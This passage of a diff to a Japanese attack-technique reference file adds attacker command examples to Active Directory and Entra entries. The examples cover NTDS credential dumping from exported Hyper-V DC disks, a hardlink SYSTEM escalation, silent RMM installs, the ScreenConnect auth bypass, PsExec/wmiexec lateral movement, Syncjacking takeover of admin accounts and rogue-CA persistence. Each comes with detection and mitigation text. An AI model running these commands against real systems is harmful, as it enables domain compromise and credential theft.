Ticket作成等による全ドメイン侵害に直結する(DCSync相当の結果だがDA権限は一切不要)。この手法は実際の侵害事例としても確認されており、MITRE ATT&CKのT1003.003(OS Credential Dumping: NTDS)は仮想ディスクのバックアップをマウントしてntds.ditを窃取した事例や、仮想化DCディスクのシャドウコピーからNTDS.ditを抽出した事例を手口として明記している。別経路として、VM削除時にHyper-Vの管理サービスVMMSが仮想ディスク(.vhdx)のアクセス許可を制御する処理の非対称性を悪用できる――VM作成時、VMMSは作成者を偽装(インパーソネート)してVHDXのアクセス許可を設定するため作成者がフルコントロールを得るが、VM削除時にVMMSが『元のアクセス許可を復元』する処理はSYSTEM権限のまま偽装せずに実行される。攻撃者は対象VHDXを削除した直後、同じパスにホスト上の任意のSYSTEM保護ファイルへのハードリンクを作成しておくことで、VM削除完了時にVMMSがそのハードリンク先ファイルへSYSTEM権限でアクセス許可を『復元』してしまい、攻撃者はそのファイルへのフルコントロールを獲得する。フルコントロールを得たファイルを書き換えてSYSTEM権限のサービスに読み込ませる、または既知の別のハードリンク系脆弱性と連鎖させることで、ホストOS自体でSYSTEM権限のコード実行に到達できる。この経路は2020年に研究者から報告された挙動で、Microsoft(MSRC)は『Hyper-V Administratorsグループはセキュリティ境界として意図されていない』としてOS側の修正を見送っており(Won't Fix)、パッチ適用では解消されない設計上の既知の限界である。なおチェックポイントのマージ(差分ディスク結合)処理についても構造的に同様の非インパーソネート操作が存在すれば同種の攻撃面となり得るが、公開されている実証はVM削除時の挙動が中心である。いずれの経路も、Hyper-V Administratorsが本来ゲストVMの範囲に限定された『半信頼』ロールであるにもかかわらずホスト本体を掌握できてしまう設計限界に起因する。",
     "tools": "Hyper-V Manager, PowerShell Hyper-Vモジュール(Export-VM/Checkpoint-VM/Mount-VHD/Mount-DiskImage), diskpart, impacket-secretsdump, ntdsutil, mimikatz(lsadump::sam / lsadump::lsa)",
+    "cmd": [
+      {
+        "tool": "Hyper-V",
+        "t": "配下の仮想化ドメインコントローラを列挙する下調べ。Hyper-V Administratorsはゲスト内部の権限を一切要求されない",
+        "q": "Get-VM"
+      },
+      {
+        "tool": "Hyper-V",
+        "t": "稼働中のDCをゲスト側監査を一切経由せずライブエクスポートしVHDXへ複製。`Export-VM`とDC名の組合せが決定的",
+        "q": "Export-VM -Name DC01 -Path D:\\Exfil"
+      },
+      {
+        "tool": "Hyper-V",
+        "t": "エクスポートの代わりにチェックポイントでも同じVHDX/AVHDXが得られる。既定のProduction CheckpointはゲストVSS経由の整合性取得で稼働継続のまま完了する",
+        "q": "Checkpoint-VM -Name DC01 -SnapshotName loot"
+      },
+      {
+        "tool": "Hyper-V",
+        "t": "取得したVHDXをホスト上に直接マウントしntds.dit/SYSTEMハイブへファイルシステムレベルで到達。DCSync拡張権限もAD監査も一切経由しない",
+        "q": "Mount-VHD -Path \"D:\\Exfil\\DC01\\Virtual Hard Disks\\DC01.vhdx\" -ReadOnly"
+      },
+      {
+        "tool": "Impacket",
+        "t": "マウント済みハイブをオフライン抽出しkrbtgt含む全ハッシュを復元。Linux側実行のためホスト側にプロセスログは一切残らない",
+        "q": "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
+      },
+      {
+        "tool": "mklink",
+        "t": "VM削除完了時にVMMSが非インパーソネートのままSYSTEM権限でアクセス許可を復元する挙動をハードリンクで突く。MicrosoftはWon't Fixとしており競合状態のため再現タイミングは不安定",
+        "q": "mklink /H C:\\Windows\\System32\\evil.dll \"C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Hard Disks\\Victim.vhdx\"\nRemove-VM -Name Victim -Force"
+      }
+    ],
     "detect": "仮想化ホスト上でのExport-VM/Checkpoint-VM/Mount-VHD/Mount-DiskImage実行(PowerShellコマンドライン、4688でフルコマンドライン監査が有効な場合)と、Microsoft-Windows-Hyper-V-VMMS-Admin/Hyper-V-Worker-Adminログ上のVM Export・Checkpoint作成・マージ・削除操作を監視する。diskpartによるVHDXマウントはdiskpart.exeがスクリプトファイル経由(diskpart /s <script>)で実行されることが多く、attach vdisk等のサブコマンドは4688のCommandLineに現れないため、diskpart.exeの起動(Sysmon Event 1)と直前の一時スクリプトファイル作成(Sysmon Event 11)の相関、またはMount-VHD/Mount-DiskImageなどPowerShellコマンドレット側の監視を主軸とする。特に稼働中DCのVM名に対するエクスポート/チェックポイント操作と、その出力先/マウント後のntds.dit・SYSTEMハイブへのファイルアクセス(4663)が短時間で連鎖する事象を相関する。Hyper-V Administratorsグループへのメンバーシップ変更(4732:ホスト上のローカルBUILTINグループへの追加が本命。ネストされたドメイン委任グループを別途運用している場合は当該グループの実名で4728/4756も監視)も高優先の監視対象。",
     "events": "Microsoft-Windows-Hyper-V-VMMS-Admin(VM Export/Checkpoint作成/削除の操作ログ), Microsoft-Windows-Hyper-V-Worker-Admin(チェックポイントマージ/VM削除), 4732(Hyper-V Administratorsローカルグループへのメンバー追加、ホスト側、本命)/4728/4756(ネストされたドメイングループへの追加、DC側・環境固有の実グループ名で監視), 4688(Export-VM/Checkpoint-VM/Mount-VHD等のコマンドライン), 4663(マウント後のntds.dit/SYSTEMハイブへのファイルアクセス), Sysmon 1(diskpart.exe/powershell.exe実行), Sysmon 11(VHDX/AVHDXファイル作成、diskpartスクリプト等の一時ファイル作成)",
     "mitigate": "仮想化DCのホストは可能な限り専用化・分離し、Hyper-V AdministratorsグループをTier0相当(実質的にドメイン管理者と同等の信頼レベル)で厳格管理してメンバーを最小化・定期棚卸しする(インフラ運用チームへの安易な付与を避ける)。VM削除時のハードリンクを悪用したホストSYSTEM昇格については、Microsoftが『Hyper-V Administratorsはセキュリティ境界として意図されていない』としてOS側の修正を見送っている(Won't Fix)ため、パッチ適用では本質的に解消できない設計上の限界であることを前提に対策する必要がある。実効性のある対策は第2世代VM+vTPMによるShielded VM(Guarded Fabric/Host Guardian ServiceのHGS Attestation)の導入であり、これによりHyper-V管理者自身であってもゲストディスクの復号鍵を取得できず、VHDXを窃取・マウントしても内容を読み取れなくなる。加えてVM Export/Checkpoint/削除操作の監査アラート化、VHDX保存領域への直接アクセス制限、ホストへの一般的なセキュリティ更新の適用(核心の設計限界自体は解消しないが、フルコントロール奪取後の権限昇格チェーンで悪用され得る派生の脆弱性を遮断する目的)を徹底する。",
@@ -11837,6 +19248,38 @@ AD.I18N.ja.attacks = [
     "summary": "正規のコード署名を持つRMM製品(ScreenConnect、AnyDesk、TeamViewer、Atera、Splashtop、NinjaOne、Action1等)を侵害端末や管理対象デバイス群に持ち込み、対話的な遠隔操作チャネルを確立して横展開・永続化するLOLRMM技法。フィッシング経由の単体インストール、侵害した正規RMMテナントからの一斉プッシュ、ConnectWise ScreenConnectのCVE-2024-1709のような認証バイパスによるサーバ掌握とExtension配布の3経路で拡散する。正規署名によりEDR/AVの信頼済み発行者リストやAppLocker/WDACの既定パスルール(Program Files配下等)を通過しやすく、Black Basta・LockBit・ALPHV/BlackCat等のランサムウェアアフィリエイトが常用する高頻度の横展開/永続化手口である。",
     "how": "攻撃者は正規のコード署名を持つRMM製品(ConnectWise ScreenConnect、AnyDesk、TeamViewer、Atera、Splashtop、NinjaOne、Action1等)を侵害端末に持ち込み、対話的な遠隔操作(画面共有・ファイル転送・コマンド実行)チャネルを確立して横展開・永続化する。持ち込み経路は主に3系統存在する。(1)フィッシングメール添付やISO/LNK同梱でRMMインストーラを直接実行させ初期侵入端末に単体設置する。(2)侵害した正規RMM管理者アカウント/テナント(既にIT運用で使われている既存の管理コンソール)から、既に登録済みの管理対象デバイス群全体へエージェント設定やスクリプトを一斉プッシュし横展開する。(3)ConnectWise ScreenConnectのCVE-2024-1709(23.9.7以前、CVSS 10.0)のように、/SetupWizard.aspxへ任意の末尾パスを付与したリクエストが.NETのPathInfo解釈の欠陥によりセットアップ済みサーバでもセットアップウィザードへの再アクセスを許してしまう認証バイパス(CWE-288: 代替パス・チャネルによる認証バイパスであり、ディレクトリトラバーサルではない)でセットアップ画面に再アクセスし任意の管理者アカウントを新規作成してサーバ自体を掌握、ScreenConnectのExtension機構(サーバ側で配布されクライアント側で自動実行されるスクリプト/実行ファイル)を悪用して同サーバに接続する全エージェントへ悪性コードを同時配布する。これらのRMMバイナリの多くはベンダーの正規コード署名証明書を持ち、EDR/AVベンダーの信頼済み発行者(トラステッドパブリッシャー)リストやLOLRMM(Living-off-the-Land RMM)プロジェクトの既知バイナリ一覧に該当するほか、Program Files配下にインストールされた場合はAppLocker/WDACの既定パスルールでも許可されがちであるため、悪性利用と正規IT運用利用がバイナリ/ハッシュレベルで区別できず検知回避性が高い。Black Basta, LockBit, ALPHV/BlackCat等のランサムウェアアフィリエイトやアクセスブローカー(IAB)が、初期侵入後のハンズオンキーボード操作やランサムウェアバイナリ配布のチャネルとして常用する。既存の「Third-Party Deployment / Config-Management Platform Abuse (PDQ/Tanium/Ansible/SaltStack)」がエージェントベースの一斉パッケージ/プレイブック配布基盤(非対話・宣言的な構成管理)を対象とするのに対し、本技法は対話的な遠隔操作GUIツール(RMM)そのものの持ち込みと、署名済み正規ツールとして検知を逃れるLOLRMM特有の観点に焦点を当てる点で区別される。なおMITRE T1071.001(Web Protocols)はRMMのHTTPS/WebSocketベースのリレー通信を指す当てはめとしてはやや弱いが、多くのRMMがクラウドリレー経由でHTTPS上に制御チャネルを多重化する実装である点では妥当性を持つ。",
     "tools": "ScreenConnect(ConnectWise), AnyDesk, TeamViewer, Atera Agent, Splashtop Streamer, NinjaOne(NinjaRMM), Action1, CVE-2024-1709 PoC(SetupWizard.aspxバイパス), LOLRMM プロジェクト(検知基準/バイナリ一覧), impacket, PsExec(RMM設置後の併用横展開ツール)",
+    "cmd": [
+      {
+        "tool": "ScreenConnect",
+        "t": "正規署名済みクライアントのサイレントインストーラ。実行ファイル名と、接続先インスタンスを示す `h=` の値が識別の起点（パラメータ構成はバージョンにより異なる）",
+        "q": "ScreenConnect.ClientSetup.exe e=Access&y=Guest&h=instance-xxxxx.screenconnect.com&p=443&s=11111111-2222-3333-4444-555555555555"
+      },
+      {
+        "tool": "CVE-2024-1709 PoC",
+        "t": "セットアップ済みサーバでもウィザードへ再アクセスできる認証バイパス。プロセスではなくHTTPリクエストとして残るためIIS/WAFログ側で見る",
+        "q": "GET /SetupWizard.aspx/literallyanything HTTP/1.1"
+      },
+      {
+        "tool": "AnyDesk",
+        "t": "サイレントインストールでスタートアップ登録まで一括実施。`--silent`と`--start-with-win`の組み合わせが自動化スクリプトの典型",
+        "q": "AnyDesk.exe --install \"C:\\Program Files (x86)\\AnyDesk\" --start-with-win --silent"
+      },
+      {
+        "tool": "AnyDesk",
+        "t": "無人アクセス用パスワードを標準入力経由で設定。CLI引数に平文が出ないためコマンドラインログには`--set-password`のみ残る",
+        "q": "echo Passw0rd! | AnyDesk.exe --set-password"
+      },
+      {
+        "tool": "PsExec",
+        "t": "RMM導入後に併用される横展開ツール。正規署名バイナリの配布後に追加実行が続く組み合わせが常套手段",
+        "q": "PsExec.exe \\\\10.0.0.20 -u corp.local\\svc_user -p Passw0rd! -s cmd.exe"
+      },
+      {
+        "tool": "Impacket",
+        "t": "侵害済みテナントから一斉プッシュする前段でリモート実行の足場を作る場合に併用。Linux発でDCにプロセスログは残らない",
+        "q": "wmiexec.py corp.local/svc_user:'Passw0rd!'@10.0.0.20"
+      }
+    ],
     "detect": "未承認のRMMサービスインストール(Service Control Manager 7045)を承認済み製品台帳と突き合わせ、初見のRMMバイナリ/証明書サブジェクトを検知する。インストーラの親プロセスがOutlook/Word/ブラウザ等のフィッシング経路を辿っていないか、あるいは正規のSCCM/Intune配布プロセス(ccmexec.exe/IntuneManagementExtension.exe)由来かをプロセス系譜で切り分ける。エンドポイントからRMMベンダーのリレードメイン(*.screenconnect.com, *.anydesk.com, *.teamviewer.com等)への通信を許可リスト外で検知し、短時間に多数端末で同一RMMバイナリのインストールが連鎖する場合は侵害されたRMM管理コンソールからの一斉プッシュを疑う。自ホスティングのConnectWise ScreenConnectサーバでは、IIS/W3Cログで/SetupWizard.aspx/への末尾パス付与アクセス直後に管理者アカウントが新規作成されていないか(CVE-2024-1709の悪用痕跡)、ScreenConnectのAuditLog.dbでExtensionの追加/変更イベントを監視する。",
     "events": "7045(新規サービスインストール), 4688(プロセス作成、プロセス監査有効時), Sysmon 1(プロセス作成), Sysmon 3(ネットワーク接続), Sysmon 11(ファイル作成:インストーラ/エージェント配置), Sysmon 13(レジストリ:自動起動・サービス登録), ScreenConnectサーバのAuditLog.db(管理者ユーザ作成/Extensionインストール), IIS/W3Cログ(SetupWizard.aspxへの異常アクセス), RMMベンダー管理コンソールの監査ログ(ログイン/デバイスへの一斉プッシュ操作)",
     "mitigate": "未承認RMMバイナリをAppLocker/WDACの拒否リストで明示的にブロックし、承認済みRMM製品を1〜2製品に限定してSCCM/Intune経由の配布のみを許可する。自ホスティングのConnectWise ScreenConnectは23.9.8以降へ即時パッチし、インターネット非公開のオンプレミス運用またはベンダーCloud版への移行、管理コンソールのMFA必須化を行う。RMM管理コンソール自体にMFA/条件付きアクセス/管理元IP制限を適用しテナント侵害を防ぐ。ネットワーク側で未承認RMMベンダードメインへの通信をプロキシ/DNSでブロックし、EDRで既知RMMバイナリのハッシュ/証明書サブジェクトをベースライン化して逸脱を検知する。",
@@ -11882,6 +19325,33 @@ AD.I18N.ja.attacks = [
     "summary": "AD Connect/Cloud Syncの識別子突合ロジックを悪用し、Domain Admin権限を持たない限定的な委任権限だけでEntra ID特権アカウントを乗っ取る手法。経路は2つある。(1)ソフトマッチ悪用: 標的が真にクラウド専用(未同期、onPremisesImmutableId未設定)の特権アカウントの場合、同じUPN/プライマリSMTPを持つ新規オンプレADユーザーを同期対象OU内に作成するだけでソフトマッチが成立し、Source of Authorityがオンプレへ強制的に移る。(2)ハードマッチ悪用(Semperisが2026年に「Syncjacking」と命名して公表した経路): 標的が既にAD Connect/Cloud Syncで同期済みのハイブリッド特権アカウント(Global Admin等)の場合、攻撃者が制御する未同期のオンプレオブジェクトへの書込権限(GenericWrite/Write-All-Properties)と、標的に紐づく既存の同期済みオンプレオブジェクトへのDelete権限という、性質の異なる2つの限定的な委任権限があれば、標的のmS-DS-ConsistencyGuid/UPNを自分のオブジェクトへ複製したうえで元の同期済みオブジェクトを削除し、次回同期でクラウド側オブジェクトのハードマッチリンクを自分のオブジェクトへ奪い取れる。いずれの経路でも、以後は攻撃者がオンプレでパスワードを自由に設定でき、MFA未登録/未検証のままそのEntra ID特権アカウントとしてサインインできてしまう。「クラウド専用または既に同期済みのアカウントは安全」という業界の前提そのものを覆す実戦的な権限昇格経路として、MSRCが正式には「Important」に分類しつつも、Microsoftが2026年にEntra Connect側でのプラットフォームレベルの緩和(不正な再リンクのブロック)を段階的に強制適用するに至った。",
     "how": "前提権限: いずれの経路もDomain Admin相当は不要。(1)ソフトマッチ経路: AD Connect/Cloud Syncの同期対象OU内にユーザーオブジェクトを作成できる限定的な委任権限があればよい(ヘルプデスクやHR連携用サービスアカウントに広めに付与されがちな権限)。対象は同期履歴を持たない真にクラウド専用の特権アカウント(onPremisesImmutableIdが未設定)に限られる。(2)ハードマッチ経路(Semperisが2026年に「Syncjacking」として公表): 対象は既にAD Connect/Cloud Syncで同期済みのハイブリッド特権アカウント(Global Admin等)。攻撃者には、自身が制御する未同期のオンプレオブジェクトに対するGenericWrite/Write-All-Properties権限と、標的に現在紐づいている既存の同期済みオンプレオブジェクトに対するDelete権限という、性質の異なる2つの限定的な委任権限が必要(いずれもOU管理を委任された一般的な運用アカウントに付与されがちな低権限操作で、書込権限だけに注目しがちな監査では見落とされやすい)。\\n\\n同期エンジンは各同期サイクル(既定30分毎のDelta、または`Start-ADSyncSyncCycle -PolicyType Delta`で即時強制可能)で、まずmS-DS-ConsistencyGuid(未設定時はobjectGUID)から導出したsourceAnchor/immutableIDによる「ハードマッチ」でクラウド側オブジェクトとの紐付けを試みる。一致するクラウドオブジェクトが無ければ、userPrincipalNameまたはproxyAddressesのプライマリSMTPアドレスが一致するクラウド専用オブジェクトを探す「ソフトマッチ」にフォールバックし、所有証明なしに属性一致だけでオンプレとクラウドを連結する。\\n\\nソフトマッチ経路: 標的のUPN/プライマリSMTPと同一値を持つ新規オンプレユーザーを`New-ADUser`で作成するだけで、次回同期時に標的のクラウド専用オブジェクトとソフトマッチが成立し、`onPremisesSyncEnabled`がfalseからtrueへ初めて切り替わってSource of Authorityがクラウドからオンプレへ移る。\\n\\nハードマッチ経路(Syncjacking): (a)標的の現在の同期済みオンプレオブジェクトが持つmS-DS-ConsistencyGuid値(参考情報としてimmutableIdは`Get-MgUser -Property onPremisesImmutableId`等で事前取得可能なことが多い)を確認する。(b)攻撃者が制御する別の未同期オンプレオブジェクトの`mS-DS-ConsistencyGuid`属性へ、`Set-ADUser -Replace @{'ms-DS-ConsistencyGuid'=<byte[]>}`等でその値を複製し、UPNも標的に合わせる。(c)標的に紐づく元の同期済みオンプレオブジェクトをDelete権限を使って削除する(`Remove-ADUser`/`Remove-ADObject`等)。(d)次回同期サイクルで、クラウド側オブジェクトのハードマッチ照合が攻撃者のオブジェクトへ再確立され、Source of Authorityの実質的な管理主体が攻撃者の制御下オブジェクトへ切り替わる。この経路では`onPremisesSyncEnabled`は最初からtrueのままであり、false→trueの切替は発生しない点がソフトマッチ経路と異なる。\\n\\nいずれの経路でも、この時点以降パスワード等の管理主体がオンプレAD側になるため、攻撃者は自身が制御するオンプレオブジェクトのパスワードを任意設定するだけで、そのままそのEntra ID特権アカウントとしてサインインできる。クラウド専用アカウント(特にGlobal Adminやbreak-glassアカウント)は「オンプレADに存在しないから同期の影響を受けない」という前提でMFA/Authenticator登録や強いConditional Accessが省略されがちであり、既にハイブリッド同期済みの特権アカウントも「同期は初回リンク確立時だけがリスク」という誤解から日常運用中の再リンクが監視対象外になりがちで、いずれの経路でも乗っ取り後に追加MFA要求なしにサインインが成立するケースが多い。\\n\\nなお、MSRCはこの手法を公式には深刻度「Important」に分類しており「Critical」指定ではないが、本マップではCVE非付番でもDomain/テナント完全掌握相当の影響を持つ技法にCriticalを付与する既存の分類慣習に則り、Global Admin奪取という到達点の重大性からCritical表記としている。Microsoftは2026年にEntra Connect側でこの種の不正な再リンクをブロックするプラットフォームレベルの緩和を段階的に強制適用開始したが、初期リリースの緩和策は回避可能との報告もあり、根本対策としては後述のTier0権限最小化とMFA必須化が引き続き重要。",
     "tools": "PowerShell ActiveDirectory module (New-ADUser, Set-ADUser -Replace ms-DS-ConsistencyGuid, Remove-ADUser/Remove-ADObject), ADSI Edit/dsacls(属性ACL・削除権限の確認/付与), Microsoft Graph PowerShell(Get-MgUser -Property onPremisesImmutableId で事前確認), Azure AD Connect/Start-ADSyncSyncCycle(同期強制実行), Synchronization Service Manager, Semperis PoC/研究ツール",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "標的のUPNと同一値で新規オンプレユーザーを作成しソフトマッチを誘発。4720とonPremisesSyncEnabledの変化の相関が鍵",
+        "q": "New-ADUser -Name 'svc-sync' -UserPrincipalName globaladmin@corp.onmicrosoft.com -Path 'OU=Sync,DC=corp,DC=local' -Enabled $true"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "標的のmS-DS-ConsistencyGuidを攻撃者オブジェクトへ複製。5136のAttributeLDAPDisplayNameがこの属性名なのが決定的シグナル",
+        "q": "Set-ADUser -Identity attacker-obj -Replace @{'mS-DS-ConsistencyGuid'=(Get-ADUser globaladmin -Properties mS-DS-ConsistencyGuid).'mS-DS-ConsistencyGuid'}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "元の同期済みオブジェクトを削除しハードマッチの再確立を誘発。直前の5136と対になる4726が決定的な組み合わせ",
+        "q": "Remove-ADUser -Identity globaladmin-sync-obj -Confirm:$false"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同期を即時強制し乗っ取りを早期に確定。既定30分毎の自動実行に対し手動起動は異常な頻度として見える",
+        "q": "Start-ADSyncSyncCycle -PolicyType Delta"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "標的のimmutableIdと同期状態を事前確認する偵察。Graphの`Get user`として正規運用と紛れる",
+        "q": "Get-MgUser -UserId globaladmin@corp.onmicrosoft.com -Property onPremisesImmutableId,onPremisesSyncEnabled"
+      }
+    ],
     "detect": "最大の検知ポイントはEntra側の同期リンク再確立イベント。Entra監査ログ(AuditLogs)で、アクターが「On-Premises Directory Synchronization Service Account」等の同期サービスであるオブジェクトのSourceAnchor/OnPremisesImmutableId/OnPremisesSyncEnabledが変更されたイベントを継続監視する。ソフトマッチ経路ではこれまでonPremisesSyncEnabled=false(クラウド専用)だった特権ロール保持者が初めてtrueに切り替わった場合が黒サイン。ハードマッチ/Syncjacking経路では対象は最初からonPremisesSyncEnabled=trueであり続けるため、フラグの初回切替ではなくSourceAnchor/OnPremisesImmutableIdの値そのものが既存値から別の値へ変化していないかを特権ロール保持者について継続監視する必要がある。オンプレ側では、同期対象OU内でのユーザー作成(4720)や属性変更(5136、AttributeLDAPDisplayName=mS-DS-ConsistencyGuid/userPrincipalName/proxyAddresses)に加え、ハードマッチ/Syncjacking経路特有の兆候として、既存の同期済みオブジェクトの削除(4726)が直前の4720/5136と近接した時間帯に同一アクターによって実行されていないかを相関させる。これらをTier0/委任済み管理者以外が実行していないか監視する。Azure AD Connect Synchronization Service Managerのエラーログにも、ソフトマッチ発生時は`AttributeValueMustBeUnique`等の競合、ハードマッチ発生時は既存リンクの再割当てに関する記録が残ることがある。乗っ取り成立直後は当該アカウントのサインインがMFAチャレンジ無し(singleFactorAuthentication)かつ未知の場所/IPから成功する傾向があり、SigninLogsとの相関が有効。",
     "events": "4720(オンプレADユーザー作成), 4726(オンプレADユーザー削除。ハードマッチ/Syncjacking経路で標的の同期済みオブジェクト削除に使用), 5136(ディレクトリオブジェクト属性変更: mS-DS-ConsistencyGuid/userPrincipalName/proxyAddresses), Entra Audit Logs「Update User」(SourceAnchor/OnPremisesImmutableId/OnPremisesSyncEnabled変更、actor=On-Premises Directory Synchronization Service Account), SigninLogs/EntraIdSignInEvents(singleFactorAuthenticationでの成功サインイン), Azure AD Connect Synchronization Service Manager 同期エラー(AttributeValueMustBeUnique等)",
     "mitigate": "(1) mS-DS-ConsistencyGuid/userPrincipalName/proxyAddresses属性への書込権限、および同期対象OU内オブジェクトへのDelete権限の両方を最小化し、同期対象OUへの委任(ユーザー作成・削除含む)をTier0/HRプロビジョニングサービスアカウントのみへ厳格に限定する。特にDelete権限は書込権限ほど注目されず棚卸しが漏れがちだが、ハードマッチ/Syncjacking経路の必須前提条件であるため重点的に点検する。(2) 可能であればソフトマッチを無効化するか、少なくともGlobal Admin等の特権クラウドアカウントをソフトマッチ対象から除外する。(3) 真にクラウド専用で運用できる特権アカウント(break-glassアカウント等)は同期スコープ外のOU/フィルタで明示的に同期対象から除外し、既存のオンプレAD属性と一切紐付かないようにする(この対策はソフトマッチ経路には有効だが、既にハイブリッド同期させている特権アカウントをハードマッチ/Syncjacking経路から守るものではない点に注意)。(4) 業務上ハイブリッド同期が必須な特権アカウントは、そのオンプレAD側リンクオブジェクトをTier0 OU/保護グループに格納し、削除・mS-DS-ConsistencyGuid変更に対して通常オブジェクトより厳格な監査アラートと誤削除防止(Accidental Deletion Prevention)を設定する。(5) Microsoftが2026年に提供した特権アカウントの同期リンク保護緩和(不正なハード/ソフトマッチによる新規リンク・再リンクをブロックする機構)を適用可能な環境では有効化する。ただし初期リリースはバイパス報告があるため、これに依存せず(1)〜(4)を優先する。(6) 特権ロール保持者にはクラウド専用/ハイブリッド問わずフィッシング耐性MFAとConditional Accessを一律必須化し、「クラウド専用/同期済みだから安全」という前提に依存した緩い認証設計を避ける。(7) onPremisesSyncEnabledの初回遷移(false→true)に加え、既に同期済みの特権ロール保持者についてSourceAnchor/OnPremisesImmutableIdの値変化そのものを継続監視し、未承認の変更に即時アラートする。",
@@ -11927,6 +19397,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entraの証明書ベース認証(CBA)機能に攻撃者が自前のルート/中間CAを信頼済みCAとして登録し、任意ユーザーのUPNをSANに埋め込んだ証明書を自CAで発行してパスワード・MFAを完全にバイパスしてなりすます、Entraネイティブの永続化バックドアである。ADFSやオンプレミスPKI連携を一切介さず、CBA単体の信頼設定操作のみで成立する。CA登録は認証方式ポリシー(X509Certificate)とは別のAPI/権限層(クラシック信頼ストアはGlobal Administrator、現行推奨のPKIベース信頼ストアはPrivileged Authentication Administrator)で行われる。登録CAに失効リスト(CRL)を設定しなければEntraは失効チェックを一切行わない(Microsoft公式ドキュメントで明記された既定動作)ため、発行済み証明書は有効期限まで無制限に使え続け、パスワードリセットやMFA再登録では無効化できない。",
     "how": "前提権限は2つの異なるAPI/権限層にまたがる。(1) CA信頼ストアへの新規CA登録: クラシック信頼ストア(/organization/{id}/certificateBasedAuthConfiguration)はGlobal Administrator、現行のMicrosoft推奨経路であるPKIベース信頼ストア(/directory/publicKeyInfrastructure/certificateBasedAuthConfigurations、Entra管理センターの[Identity Secure Score]>[Public key infrastructure])はPrivileged Authentication Administratorが必要。(2) 認証方式ポリシー(/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/X509Certificate)配下のcertificateUserBindings・authenticationModeConfiguration・crlValidationConfigurationの例外設定・CBA有効化/対象グループ設定はAuthentication Policy Administratorで変更できるが、このロール単体では新規CAを登録できない。\\n\\n攻撃者はまずopensslまたはPowerShellのNew-SelfSignedCertificateでルート(または中間)CA鍵ペアを生成する。クラシック信頼ストアを使う場合、New-MgOrganizationCertificateBasedAuthConfiguration(certificateAuthoritiesコレクション内でauthorityType=RootAuthority/IntermediateAuthority、trustedCertificate、crlDistributionPoint等を指定)で自CAを登録する。この配置はUpdateがサポートされておらず(既存設定を変更するには一度DELETEしてから新しいcertificateAuthorities配列全体を含む設定をCREATEし直す仕様)、単一のCAを追加するだけでも既存の正規CA一覧を丸ごと再送信するDELETE→CREATEの操作対として監査ログに残る。PKIベース信頼ストアを使う場合はGraph beta PATCH /directory/publicKeyInfrastructure/certificateBasedAuthConfigurations/{pkiId}/certificateAuthorities/{caId}でisRootAuthority・certificate・CRL URL等を指定し自CAをPKIコンテナに追加する(テナントあたり最大250CA)。\\n\\n次に、標的ユーザーのUPNをSubject Alternative NameのotherName(OID 1.3.6.1.4.1.311.20.2.3=UPN、RFC822NameバインディングならメールアドレスでもOK)に埋め込んだクライアント証明書を自CAで発行する。既定のcertificateUserBindingsはPrincipalName→userPrincipalNameの単一バインディングであり、高保証バインディング(SubjectKeyIdentifier、IssuerAndSerialNumber等)が別途設定されていない限りSANの値のみで本人確認が完結する。この証明書をクライアント証明書ストアにインポートしEntraのサインイン画面でCBAを選択するだけで、パスワードもMFAチャレンジも提示せずそのユーザーとして認証が成立する。\\n\\n登録CAにcrlDistributionPoint/deltaCrlDistributionPointを設定しなければEntraはそのCA発行証明書の失効チェックを一切行わないため、発行証明書は証明書自体の有効期限が尽きるまで無条件に有効であり、対象ユーザーのパスワードリセット・MFA再登録・要素取り消しの影響を受けない。ただしテナントがX509Certificate認証方式ポリシーのcrlValidationConfiguration.state=enabled(\"CRL検証を必須にする\")を既に有効化している場合、CRL未設定のCAが発行した証明書は認証時に拒否されるため、攻撃者はこの設定の有無を事前確認するか、Authentication Policy Administrator権限でexemptedCertificateAuthoritiesSubjectKeyIdentifiersに自CAを追加して例外化する必要がある。CA登録権限を持つ攻撃者は同一CAから任意の追加ユーザー(Global Administrator等)になりすます証明書をいつでも新規発行でき、単一の信頼設定変更が組織全体に及ぶ持続的ななりすまし基盤となる。",
     "tools": "OpenSSL, PowerShell (New-SelfSignedCertificate), Microsoft Graph PowerShell (New-MgOrganizationCertificateBasedAuthConfiguration/Get-MgOrganizationCertificateBasedAuthConfiguration [クラシック信頼ストア。Updateは非サポートでDelete+Create]、Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration [X509Certificate認証方式ポリシー]、Invoke-MgGraphRequest -Method PATCH /beta/directory/publicKeyInfrastructure/... [PKIベース信頼ストア]), Microsoft Graph API, EntraGoat(Semperis、CBA脆弱シナリオPoC), Entra管理センター([Public key infrastructure]/[認証方法]>[証明書ベースの認証])",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "攻撃者CAをクラシック信頼ストアに登録。Update非対応のためDELETE→CREATE対の再送信として監査ログに残る",
+        "q": "New-MgOrganizationCertificateBasedAuthConfiguration -OrganizationId <tenantId> -BodyParameter @{ CertificateAuthorities = @(@{ IsRootAuthority = $true; Certificate = [System.IO.File]::ReadAllBytes('rogue-ca.cer') }) }"
+      },
+      {
+        "tool": "Graph API",
+        "t": "現行推奨のPKIベース信頼ストアへ攻撃者CAを追加。CRL URL未設定だと以後失効チェックが一切行われない点が持続化の核",
+        "q": "Invoke-MgGraphRequest -Method PATCH -Uri 'https://graph.microsoft.com/beta/directory/publicKeyInfrastructure/certificateBasedAuthConfigurations/<pkiId>/certificateAuthorities/<caId>' -Body '{\"isRootAuthority\":true,\"certificate\":\"<base64>\"}'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "攻撃者ルートCAをローカルで生成。証明書ストア操作のためクラウド側ログには現れず後続のCA登録操作でのみ検知できる",
+        "q": "New-SelfSignedCertificate -Subject 'CN=Rogue Root CA' -KeyUsage CertSign -CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(10)"
+      },
+      {
+        "tool": "OpenSSL",
+        "t": "Linux側でのCA生成。プロセスログを一切残さず生成物を後続のCA登録操作に渡すだけで済む",
+        "q": "openssl req -x509 -newkey rsa:4096 -keyout rogue-ca.key -out rogue-ca.cer -days 3650 -nodes -subj '/CN=Rogue Root CA'"
+      },
+      {
+        "tool": "Graph PowerShell",
